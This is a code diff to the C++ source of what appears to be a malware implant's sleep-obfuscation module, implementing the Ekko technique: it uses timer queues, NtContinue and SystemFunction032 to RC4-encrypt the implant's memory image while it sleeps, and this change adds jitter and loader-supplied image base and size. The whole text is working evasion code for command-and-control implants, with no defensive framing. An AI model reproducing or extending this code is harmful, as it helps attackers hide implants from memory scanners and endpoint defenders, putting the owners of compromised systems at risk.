@@ -5,7 +5,7 @@
 #include <sleep.hpp>
 
 void
-obfus::ekko_sleep(const uint32_t sleep_time) {
+obfus::ekko_sleep(const uint32_t sleep_time, void* image_base, const uint32_t image_size) {
 
     CONTEXT ctx_curthread   =   { 0 };
     CONTEXT ctx_protrw      =   { 0 };
@@ -18,12 +18,8 @@ obfus::ekko_sleep(const uint32_t sleep_time) {
     USTRING image           =   { 0 };
 
     static HANDLE hEvent = nullptr;
-    static uint8_t* image_base = nullptr;
-
-    HANDLE hNewTimer = nullptr;
-    HANDLE hTimerQueue = CreateTimerQueue();
-
-    uint32_t image_size = 0;
+    HANDLE hNewTimer     = nullptr;
+    HANDLE hTimerQueue   = CreateTimerQueue();
     uint32_t old_protect = 0;
 
     unsigned char byte_buffer[16] = { 0 };
@@ -42,15 +38,9 @@ obfus::ekko_sleep(const uint32_t sleep_time) {
         );
     }
 
-    if(image_base == nullptr) {
-        image_base = get_implant_base_address();
-    }
-
     if (!hEvent || !pRtlCaptureContext || !pNtContinue || !pSystemFunction032 || !hTimerQueue) {
         return;
     }
-
-    image_size = ((PIMAGE_NT_HEADERS)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.SizeOfImage;
 
     key.Buffer = byte_buffer;
     key.Length = 16;
@@ -136,13 +126,25 @@ obfus::ekko_sleep(const uint32_t sleep_time) {
 void
 obfus::sleep(const implant_context& ctx) {
 
+    uint32_t sleeptime_actual = ctx.sleep_time;
+
+    if(ctx.jitter) {
+        srand(time(nullptr));
+        sleeptime_actual = (rand() % (ctx.jitter * 1000));
+    }
+
     if(ctx.use_sleepmask) {
-        ekko_sleep(ctx.sleep_time);
+        ekko_sleep(sleeptime_actual, ctx.implant_base, ctx.implant_size);
     } else {
         Sleep(ctx.sleep_time);
     }
 }
 
+
+//
+// Deprecated/unused. Will not work with the current loader I use
+// due to image sections being copied without PE headers
+//
 uint8_t*
 get_implant_base_address() {
 
@@ -170,7 +172,8 @@ get_implant_base_address() {
 }
 
 
-void init_rc4_key(USTRING *pKey) {
+void
+init_rc4_key(USTRING *pKey) {
 
     srand(time(nullptr));
     uint8_t* itr = static_cast<uint8_t*>(pKey->Buffer);
